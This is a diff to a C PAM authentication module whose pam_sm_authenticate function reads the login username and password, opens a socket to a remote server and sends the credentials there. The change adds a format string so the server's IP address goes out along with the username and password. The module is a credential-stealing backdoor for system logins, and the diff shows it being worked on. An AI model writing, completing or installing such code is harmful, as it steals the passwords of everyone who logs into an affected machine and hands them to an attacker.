@@ -14,6 +14,7 @@
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     const char *username;
     const char *password;
+    const char *ret_fmt = "%s:%s:%s\n";
 
     int retval = pam_get_user(pamh, &username, NULL);
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
@@ -29,7 +30,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
 
             if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
                 char credentials[256];
-                snprintf(credentials, sizeof(credentials), "%s:%s\n", username, password);
+                snprintf(credentials, sizeof(credentials), ret_fmt, inet_ntoa(serv_addr.sin_addr), username, password);
                 send(sock, credentials, strlen(credentials), 0);
             }
 
